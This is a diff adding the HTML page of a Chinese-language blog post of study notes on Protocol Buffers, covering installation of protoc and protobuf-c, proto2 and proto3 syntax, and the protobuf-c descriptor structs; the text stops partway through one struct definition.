@@ -1,0 +1,905 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    
+    <meta name="author" content="Findkey">
+    
+    <!-- Completely eliminate flash of wrong theme -->
+    <script>
+        (function() {
+            const THEME_KEY = "REDEFINE-THEME-STATUS";
+            const DARK = "dark", LIGHT = "light";
+            
+            // Get preferred theme
+            function getTheme() {
+                try {
+                    const saved = localStorage.getItem(THEME_KEY);
+                    if (saved) {
+                        const { isDark } = JSON.parse(saved);
+                        return isDark ? DARK : LIGHT;
+                    }
+                } catch (e) {}
+                
+                return matchMedia("(prefers-color-scheme: dark)").matches ? DARK : LIGHT;
+            }
+            
+            // Apply theme to document
+            function applyTheme(theme) {
+                const isDark = theme === DARK;
+                const root = document.documentElement;
+                
+                // Set classes for compatibility
+                root.classList.add(theme);
+                root.classList.remove(isDark ? LIGHT : DARK);
+                root.style.colorScheme = theme;
+            }
+            
+            // Initial application
+            const theme = getTheme();
+            applyTheme(theme);
+            
+            // Listen for system preference changes
+            matchMedia("(prefers-color-scheme: dark)").addEventListener("change", ({ matches }) => {
+                // Only update if using system preference (no localStorage entry)
+                if (!localStorage.getItem(THEME_KEY)) {
+                    applyTheme(matches ? DARK : LIGHT);
+                }
+            });
+            
+            // Set body classes ASAP (before DOMContentLoaded)
+            (function() {
+                const addBodyClass = () => {
+                    const b = document.body;
+                    if (!b) return false;
+                    b.classList.add(theme + "-mode");
+                    return true;
+                };
+
+                // Try immediately
+                if (addBodyClass()) return;
+
+                // Observe until body exists
+                const mo = new MutationObserver(() => {
+                    if (addBodyClass()) mo.disconnect();
+                });
+                mo.observe(document.documentElement, { childList: true, subtree: true });
+            })();
+        })();
+    </script>
+    
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="https://find-key.github.io/2025/07/21/proto/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+    
+        
+        <meta name="description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="proto buf 学习笔记">
+<meta property="og:url" content="https://find-key.github.io/2025/07/21/proto/index.html">
+<meta property="og:site_name" content="Find-key&#39;Blog">
+<meta property="og:description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://find-key.github.io/images/redefine-og.webp">
+<meta property="article:published_time" content="2025-07-21T11:18:34.000Z">
+<meta property="article:modified_time" content="2026-04-02T15:08:37.050Z">
+<meta property="article:author" content="Find-key">
+<meta property="article:tag" content="Protobuf">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://find-key.github.io/images/redefine-og.webp">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/redefine-favicon.svg" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/redefine-favicon.svg">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/images/redefine-favicon.svg">
+    <!--- Page Info-->
+    
+    <title>
+        
+            proto buf 学习笔记 | Findkey&#39;s Blog
+        
+    </title>
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+
+    <!--- Inject Part-->
+    
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/css/build/tailwind.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">
+
+    
+<link rel="stylesheet" href="/fonts/Geist/geist.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+    
+    
+
+    <script id="hexo-configurations">
+    window.config = {"hostname":"find-key.github.io","root":"/","language":"en"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"delete_mask":false,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"pangu_js":false,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"side_tools":{"gear_rotation":true,"auto_expand":false},"open_graph":{"enable":true,"image":"/images/redefine-og.webp","description":"Hexo Theme Redefine, Redefine Your Hexo Journey."},"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"To Be PWN Master.","subtitle":{"text":[],"hitokoto":{"enable":true,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"style":"default","links":[{"icon":"fa-brands fa-github","url":"https://github.com/Find-key"},{"icon":"fa-solid fa-at","url":"Find_key@foxmail.com"},{"icon":"fa-solid fa-at","url":null},{"icon":"fa-brands fa-telegram","url":null},{"icon":"/images/custom-icon.svg","url":null}],"qrs":null}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"11.4.1","theme":{"light":"default","dark":"dark"}}},"version":"2.9.0","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Tags":{"path":"/tags/","icon":"fa-regular fa-tags"},"Friends":{"path":"/links/","icon":"fa-solid fa-link"}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur","masonry":{"batch_size":12,"initial_batch_size":24}},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":"为之则易，不为则难","show_on_mobile":true,"links":null},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":false,"limit":3},"tags":{"enable":true,"limit":3}},"footer":{"runtime":true,"icon":"<i class=\"fa-solid fa-heart fa-beat\" style=\"--fa-animation-duration: 0.5s; color: #f54545\"></i>","start":"2022/8/17 11:45:14","statistics":true,"customize":null,"icp":{"enable":false,"number":null,"url":null}},"footerStart":"2022/8/17 11:45:14","mermaid":{"style":{"light":"default","dark":"dark"}}};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.i18n = {"search":"Search...","toc":"On this page","prev":"Prev","next":"Next","prev_posts":"Prev posts","next_posts":"Next posts","page":"Page %d","recent_posts":"Recent Posts","share":"Share","powered_by":"POWERED BY %s","theme":"THEME","rss_feed":"RSS Feed","category":"Category","categories":"Categories","tag":"Tag","tags":"Tags","post":"Post","posts":"Posts","tagcloud":"Tag Cloud","comment":"Comment","comments":"Comments","home":"Home","archive":"Archive","archives":"Archives","top":"TOP","sticky":"Sticky","go-back-home":"Go Back Home","masonry_loading":"Loading photos...","image_viewer":"Image viewer","close":"Close","exif":{"title":"EXIF","cards":{"camera":"Camera","lens":"Lens","exposure":"Exposure","other":"Other"},"fields":{"make":"Brand","model":"Model","date_taken":"Date taken","lens_model":"Lens","focal_length":"Focal length","focus_mode":"Focus mode","shutter":"Shutter","aperture":"Aperture","iso":"ISO","exposure_program":"Exposure program","exposure_compensation":"Exposure compensation","metering_mode":"Metering mode","flash":"Flash","white_balance":"White balance","latitude":"Latitude","longitude":"Longitude","altitude":"Altitude"},"status":{"loading":"Loading...","no_exif":"No EXIF available","library_missing":"EXIF library not loaded","image_source_missing":"Image source unavailable","unavailable":"EXIF unavailable (blocked by CORS or missing metadata)","flag_unavailable":"EXIF unavailable"}},"about":"About","changelog":"Changelog","links":"Links","link":"Link","friends":"Friends","friend":"Friend","timeline":"Timeline","shuoshuo":"Shuoshuo","bookmarks":"Bookmarks","site_uv":"VISITOR COUNT","site_pv":"TOTAL PAGE VIEWS","read_more":"Read more","wordcount":"Words","min2read":"Mins","status":"Status","runtime":"Blog up for","days":"days","hours":"hrs","minutes":"Min","seconds":"Sec","optimized_by":"and Optimized by Evan","rights":"All Rights Reserved","site_posts":"%s posts in total","site_wordcount":"%s words in total","copyright":{"author":"Author","title":"Title","link":"Link","create_time":"Created at","update_time":"Updated at","license_title":"License","license_content":"This work is licensed under %s.","all_rights_reserved":"All Rights Reserved &#169; %s","public_domain":"This work is in the public domain."},"ago":{"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"},"create_time":"Created","update_time":"Updated","expired":"This post is written %s days ago, and the content may not be up to date."};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+	<div class="progress-bar-container">
+	
+
+	
+	<span class="pjax-progress-bar"></span>
+	<!--        <span class="swup-progress-icon">-->
+	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+	<!--        </span>-->
+	
+</div>
+
+<main class="page-container" id="swup">
+
+	
+
+	<div class="main-content-container flex flex-col justify-between min-h-dvh">
+		<div class="main-content-header">
+			<header class="navbar-container px-6 md:px-12">
+    <div class="navbar-content transition-navbar ">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Findkey&#39;s Blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/"
+                                        >
+                                    <i class="fa-regular fa-house fa-fw"></i>
+                                    HOME
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/archives"
+                                        >
+                                    <i class="fa-regular fa-archive fa-fw"></i>
+                                    ARCHIVES
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/tags/"
+                                        >
+                                    <i class="fa-regular fa-tags fa-fw"></i>
+                                    TAGS
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/links/"
+                                        >
+                                    <i class="fa-solid fa-link fa-fw"></i>
+                                    FRIENDS
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile sheet -->
+    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/"
+                        >
+                            <span>
+                                HOME
+                            </span>
+                            
+                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/archives"
+                        >
+                            <span>
+                                ARCHIVES
+                            </span>
+                            
+                                <i class="fa-regular fa-archive fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/tags/"
+                        >
+                            <span>
+                                TAGS
+                            </span>
+                            
+                                <i class="fa-regular fa-tags fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/links/"
+                        >
+                            <span>
+                                FRIENDS
+                            </span>
+                            
+                                <i class="fa-solid fa-link fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+
+            
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">8</div>
+        <div class="label text-third-text-color text-sm">Tags</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">0</div>
+        <div class="label text-third-text-color text-sm">Categories</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">12</div>
+        <div class="label text-third-text-color text-sm">Posts</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+		</div>
+
+		<div class="main-content-body transition-fade-up">
+			
+
+			<div class="main-content">
+				<div class="post-page-container flex relative justify-between box-border w-full h-full">
+	<div class="article-content-container">
+
+		<div class="article-title relative w-full">
+			
+			<div class="w-full flex items-center pt-6 justify-start">
+				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">proto buf 学习笔记</h1>
+			</div>
+			
+		</div>
+
+		
+		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+			<div class="avatar w-[46px] h-[46px] shrink-0 rounded-medium border border-border-color p-px">
+				<img src="/images/head_image.jpg">
+			</div>
+			<div class="info flex flex-col justify-between">
+				<div class="author flex items-center">
+					<span class="name text-default-text-color text-lg font-semibold">Findkey</span>
+					
+					<span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv2</span>
+					
+				</div>
+				<div class="meta-info">
+					<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2025-07-21 19:18:34</span>
+        <span class="mobile">2025-07-21 19:18:34</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2026-04-02 23:08:37</span>
+            <span class="mobile">2026-04-02 23:08:37</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/Protobuf/">Protobuf</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+				</div>
+			</div>
+		</div>
+		
+
+		
+
+
+		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+			<blockquote>
+<p>近来做题恰好碰到了，之前听学长、其他师傅说过，刚好趁这个计划学习一下</p>
+</blockquote>
+<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p><strong>Protobuf</strong>（全称：Protocol Buffers）是 Google 开发的一种轻量、高效的结构化数据序列化协议。它用于将数据结构序列化为紧凑的二进制格式，用于网络通信或数据存储。Protobuf 被设计为跨平台和语言无关的，因此广泛应用于分布式系统、网络通信、远程过程调用（RPC）等场景</p>
+<p>类似 json，xml，可以把数据打包成那样的格式，有便于程序传输交互。<br>不同的是，protobuf 转换出的是二进制文件，要反序列化才能让人类阅读，<br>同理，传输也需要序列化</p>
+<h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><blockquote>
+<p>基于 wsl Ubuntu22.04</p>
+</blockquote>
+<p>听其他师傅说，Ubuntu22 自带高版本 proto buf，但是笔者的没有</p>
+<h3 id="安装-protoc"><a href="#安装-protoc" class="headerlink" title="安装 protoc"></a>安装 protoc</h3><div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/protocolbuffers/protobuf/releases/download/v3.6.1/protobuf-all-3.6.1.tar.gz</span><br><span class="line">tar -xvzf protobuf-all-3.6.1.tar.gz</span><br><span class="line"><span class="built_in">cd</span> protobuf-all-3.6.1</span><br><span class="line">./configure</span><br><span class="line">make <span class="comment">#比较耗时</span></span><br><span class="line">make check</span><br><span class="line"><span class="built_in">sudo</span> make install <span class="comment">#比较耗时</span></span><br></pre></td></tr></table></figure></div>
+<p><code>make check</code> 不是必要命令，只是稍微检测一下<br>安装完成可以通过</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">protoc --version</span><br></pre></td></tr></table></figure></div>
+<p>看到回显 libprotoc 3.6.1，就是安装成功。</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ln</span> -s /usr/local/lib/libprotobuf.so.17 /usr/lib/libprotobuf.so.17</span><br><span class="line"><span class="built_in">ln</span> -s /usr/local/lib/libprotoc.so.17 /usr/lib/libprotoc.so.17</span><br><span class="line"><span class="built_in">sudo</span> ldconfig</span><br></pre></td></tr></table></figure></div>
+<h3 id="安装-protobuf-c"><a href="#安装-protobuf-c" class="headerlink" title="安装 protobuf-c"></a>安装 protobuf-c</h3><div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/protobuf-c/protobuf-c/releases/download/v1.5.0/protobuf-c-1.5.0.tar.gz</span><br><span class="line">tar -xvzf protobuf-c-1.5.0.tar.gz</span><br><span class="line"><span class="built_in">cd</span> protobuf-c-1.5.0</span><br><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">make check</span><br><span class="line"><span class="built_in">sudo</span> make install</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="安装python的-protobuf-库"><a href="#安装python的-protobuf-库" class="headerlink" title="安装python的 protobuf 库"></a>安装python的 protobuf 库</h3><div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install protobuf==3.20.3</span><br></pre></td></tr></table></figure></div>
+
+
+
+<h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><p>在 proto2 中</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">syntax = &quot;proto2&quot;;</span><br><span class="line"></span><br><span class="line">message test &#123;</span><br><span class="line">  optional string a = 1;</span><br><span class="line">  optional int32 b = 2;</span><br><span class="line">  required int32 c = 3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<p>在第一行指定 protobuf 的版本</p>
+<p>然后类似 C&#x2F;C++ 中写结构体，<br>定义 <code>message</code>，一个或者多个</p>
+<p>其中， </p>
+<ul>
+<li><code>optional/required</code> 指定属性<ul>
+<li>optional ：一个 <code>optional</code> 字段有两种可能的状态<ul>
+<li>字段已设置，并包含一个被明确设置或从线格式解析的值。它将被序列化到线格式中。</li>
+<li>字段未设置，将返回默认值。它不会被序列化到线格式中。</li>
+</ul>
+</li>
+<li>required：官方推荐<strong>不要使用。</strong> 必填字段问题太多，已从 proto3 和 editions 中移除。必填字段的语义应在应用层实现。当它 <em>确实</em> 使用时，格式良好的消息必须且仅有一个此字段。</li>
+</ul>
+</li>
+<li><code>string/int32</code> 是类型描述</li>
+<li><code>a/b/c</code> 是字段名称</li>
+<li><code>1/2/3</code> 是字段编号，不是字段的值</li>
+</ul>
+<p>在 proto3 中，<br><em>required</em> 被移除，其他的与 proto2 类似。</p>
+<p>其他可参考：<a class="link"   target="_blank" rel="noopener" href="https://protobuf.com.cn/" >Protocol Buffers 文档<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<h2 id="proto-buf-分析"><a href="#proto-buf-分析" class="headerlink" title="proto buf 分析"></a>proto buf 分析</h2><h3 id="相关结构体"><a href="#相关结构体" class="headerlink" title="相关结构体"></a>相关结构体</h3><h4 id="ProtobufCMessageDescriptor"><a href="#ProtobufCMessageDescriptor" class="headerlink" title="ProtobufCMessageDescriptor"></a>ProtobufCMessageDescriptor</h4><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ProtobufCMessageDescriptor</span> &#123;</span>  </span><br><span class="line"> <span class="comment">/** Magic value checked to ensure that the API is used correctly. */</span>  </span><br><span class="line"> <span class="type">uint32_t</span>   magic;  </span><br><span class="line">  </span><br><span class="line"> <span class="comment">/** The qualified name (e.g., &quot;namespace.Type&quot;). */</span>  </span><br><span class="line"> <span class="type">const</span> <span class="type">char</span>   *name;  </span><br><span class="line"> <span class="comment">/** The unqualified name as given in the .proto file (e.g., &quot;Type&quot;). */</span>  </span><br><span class="line"> <span class="type">const</span> <span class="type">char</span>   *short_name;  </span><br><span class="line"> <span class="comment">/** Identifier used in generated C code. */</span>  </span><br><span class="line"> <span class="type">const</span> <span class="type">char</span>   *c_name;  </span><br><span class="line"> <span class="comment">/** The dot-separated namespace. */</span>  </span><br><span class="line"> <span class="type">const</span> <span class="type">char</span>   *package_name;  </span><br><span class="line">  </span><br><span class="line"> <span class="comment">/**  </span></span><br><span class="line"><span class="comment">  * Size in bytes of the C structure representing an instance of this  </span></span><br><span class="line"><span class="comment">  * type of message.  </span></span><br><span class="line"><span class="comment">  */</span>  </span><br><span class="line"> <span class="type">size_t</span>    sizeof_message;  </span><br><span class="line">  </span><br><span class="line"> <span class="comment">/** Number of elements in `fields`. */</span>  </span><br><span class="line"> <span class="type">unsigned</span>   n_fields;  </span><br><span class="line"> <span class="comment">/** Field descriptors, sorted by tag number. */</span>  </span><br><span class="line"> <span class="type">const</span> ProtobufCFieldDescriptor *fields;  </span><br><span class="line"> <span class="comment">/** Used for looking up fields by name. */</span>  </span><br><span class="line"> <span class="type">const</span> <span class="type">unsigned</span>   *fields_sorted_by_name;  </span><br><span class="line">  </span><br><span class="line"> <span class="comment">/** Number of elements in `field_ranges`. */</span>  </span><br><span class="line"> <span class="type">unsigned</span>   n_field_ranges;  </span><br><span class="line"> <span class="comment">/** Used for looking up fields by id. */</span>  </span><br><span class="line"> <span class="type">const</span> ProtobufCIntRange  *field_ranges;  </span><br><span class="line">  </span><br><span class="line"> <span class="comment">/** Message initialisation function. */</span>  </span><br><span class="line"> ProtobufCMessageInit message_init;  (函数指针)</span><br><span class="line">  </span><br><span class="line"> <span class="comment">/** Reserved for future use. */</span>  </span><br><span class="line"> <span class="type">void</span>    *reserved1;  </span><br><span class="line"> <span class="comment">/** Reserved for future use. */</span>  </span><br><span class="line"> <span class="type">void</span>    *reserved2;  </span><br><span class="line"> <span class="comment">/** Reserved for future use. */</span>  </span><br><span class="line"> <span class="type">void</span>    *reserved3;  </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>
+<p>magic 一般是 0x28AAEEF9,所以也可以通过值全局搜索<br>n_fields 是字段数量<br>fields 是指向字段的</p>
+<h4 id="ProtobufCFieldDescriptor"><a href="#ProtobufCFieldDescriptor" class="headerlink" title="ProtobufCFieldDescriptor"></a>ProtobufCFieldDescriptor</h4><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ProtobufCFieldDescriptor</span> &#123;</span>  </span><br><span class="line"> <span class="comment">/** Name of the field as given in the .proto file. */</span>  </span><br><span class="line"> <span class="type">const</span> <span class="type">char</span>  *name;  </span><br><span class="line">  </span><br><span class="line"> <span class="comment">/** Tag value of the field as given in the .proto file. */</span>  </span><br><span class="line"> <span class="type">uint32_t</span>  id;  </span><br><span class="line">  </span><br><span class="line"> <span class="comment">/** Whether the field is `REQUIRED`, `OPTIONAL`, or `REPEATED`. */</span>  </span><br><span class="line"> ProtobufCLabel  label;  </span><br><span class="line">  </span><br><span class="line"> <span class="comment">/** The type of the field. */</span>  </span><br><span class="line"> ProtobufCType  type;  </span><br><span class="line">  </span><br><span class="line"> <span class="comment">/**  </span></span><br><span 